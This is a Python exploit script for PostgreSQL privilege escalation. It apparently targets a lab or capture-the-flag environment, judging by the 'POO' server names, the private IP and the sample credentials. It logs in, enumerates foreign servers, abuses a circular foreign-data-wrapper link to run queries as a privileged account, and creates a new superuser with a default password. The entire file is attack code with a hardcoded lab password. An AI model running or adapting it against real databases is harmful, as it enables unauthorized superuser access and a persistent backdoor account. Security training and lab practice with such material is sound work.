#!/usr/bin/env python3
"""
PostgreSQL Linked Server Privilege Escalation
Exploits circular FDW links to gain superuser access
Similar to MS SQL Server linked server attacks
"""

import psycopg2
import sys

def connect_db(host, port, dbname, user, password):
    """Connect to PostgreSQL database"""
    try:
        conn = psycopg2.connect(
            host=host,
            port=port,
            dbname=dbname,
            user=user,
            password=password
        )
        conn.autocommit = True
        return conn
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return None

def check_current_user(cursor):
    """Check current user"""
    cursor.execute("SELECT current_user, session_user;")
    result = cursor.fetchone()
    print(f"[*] Current user: {result[0]}, Session user: {result[1]}")
    return result[0]

def check_superuser(cursor):
    """Check if current user is superuser"""
    cursor.execute("SELECT usesuper FROM pg_user WHERE usename = current_user;")
    result = cursor.fetchone()
    return result[0] if result else False

def list_linked_servers(cursor):
    """List available foreign servers (linked servers)"""
    cursor.execute("""
        SELECT srvname, srvowner::regrole, srvoptions
        FROM pg_foreign_server;
    """)
    servers = cursor.fetchall()
    print("\n[*] Foreign Servers (Linked Servers):")
    for srv in servers:
        print(f"    - {srv[0]} (owner: {srv[1]})")
    return servers

def exec_on_linked(cursor, server_name, query):
    """Execute query on linked server using dblink"""
    try:
        cursor.execute(f"SELECT * FROM exec_on_config('{query}');")
        return cursor.fetchall()
    except Exception as e:
        print(f"[-] Error executing on linked server: {e}")
        return None

def exploit_circular_link(cursor):
    """Exploit circular link to escalate privileges"""
    print("\n[*] Attempting circular link privilege escalation...")

    # Step 1: Check what user we are on POO_CONFIG
    print("[*] Step 1: Querying linked server POO_CONFIG...")
    result = exec_on_linked(cursor, 'poo_config_link', 'SELECT current_user')
    if result:
        print(f"[+] User on POO_CONFIG: {result[0][0]}")

    # Step 2: Check if POO_CONFIG has a link back to POO_PUBLIC
    print("[*] Step 2: Checking for circular link back...")
    result = exec_on_linked(cursor, 'poo_config_link',
                           "SELECT srvname FROM pg_foreign_server")
    if result:
        print(f"[+] Linked servers on POO_CONFIG: {result}")

    # Step 3: Execute through circular link to get superuser
    print("[*] Step 3: Exploiting circular link...")
    escalation_query = """
        SELECT * FROM exec_on_public_as_sa('SELECT current_user')
    """
    result = exec_on_linked(cursor, 'poo_config_link', escalation_query)
    if result:
        print(f"[+] User after circular escalation: {result}")
        return True
    return False

def create_superuser(cursor, username, password):
    """Create new superuser through circular link"""
    print(f"\n[*] Creating superuser {username}...")

    create_user_query = f"""
        SELECT * FROM exec_on_public_as_sa(
            'CREATE USER {username} WITH SUPERUSER PASSWORD ''{password}'''
        )
    """
    exec_on_linked(cursor, 'poo_config_link', create_user_query)
    print(f"[+] Superuser {username} created with password {password}")

def main():
    if len(sys.argv) < 5:
        print(f"Usage: {sys.argv[0]} <host> <user> <password> <action>")
        print(f"Actions: check, escalate, create_user")
        print(f"Example: {sys.argv[0]} 192.168.3.12 external_user '#p00Public3xt3rnalUs3r#' check")
        sys.exit(1)

    host = sys.argv[1]
    user = sys.argv[2]
    password = sys.argv[3]
    action = sys.argv[4]

    print(f"[*] Connecting to PostgreSQL at {host} as {user}...")
    conn = connect_db(host, 5432, 'poo_public', user, password)

    if not conn:
        sys.exit(1)

    cursor = conn.cursor()

    check_current_user(cursor)
    is_super = check_superuser(cursor)
    print(f"[*] Superuser: {is_super}")

    list_linked_servers(cursor)

    if action == 'escalate':
        exploit_circular_link(cursor)
    elif action == 'create_user':
        if len(sys.argv) >= 7:
            create_superuser(cursor, sys.argv[5], sys.argv[6])
        else:
            create_superuser(cursor, 'super', 'abc123!')

    cursor.close()
    conn.close()

if __name__ == "__main__":
    main()
